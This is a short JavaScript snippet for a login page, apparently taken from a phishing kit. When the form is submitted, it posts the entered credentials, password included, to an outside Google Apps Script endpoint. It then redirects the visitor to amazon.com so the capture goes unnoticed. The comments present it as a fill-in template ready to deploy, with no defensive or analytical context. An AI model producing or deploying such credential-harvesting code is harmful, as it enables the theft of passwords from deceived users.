    <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycby2JbvfqW10O4DDXAg9F3ZcTXjFbKRcfID-jollElYeheY1FtS6rr0kXrHLYPX-HxKQ5w/exec'; // Your Web App URL

    const form = document.forms['login-form'];
    const errorMessage = document.getElementById('error-message');
    const passwordInput = form.elements['password'];

    form.addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent the default form submission

        // Get the form data
        const formData = new FormData(form);
        const password = formData.get('password');

        // Password validation (must be at least 6 characters)
        if (password.length < 6) {
            errorMessage.style.display = 'block'; // Show error message
            setTimeout(() => {
                errorMessage.style.display = 'none'; // Hide error message after 3 seconds
            }, 3000);
            return; // Prevent form submission
        }

        // Send the form data to your Google Apps Script Web App
        fetch(scriptURL, {
            method: 'POST',
            body: formData
        })
        .then(response => response.text()) // Handle response as text
        .then(result => {
            console.log('Login Success!', result);
            // Redirect to another site after successful submission
            window.location.href = 'https://www.amazon.com/'; // Replace with your desired URL
        })
        .catch(error => {
            console.error('Error!', error);
            alert('Login failed: ' + error.message); // You can leave the error alert if desired
        });
    });
</script>
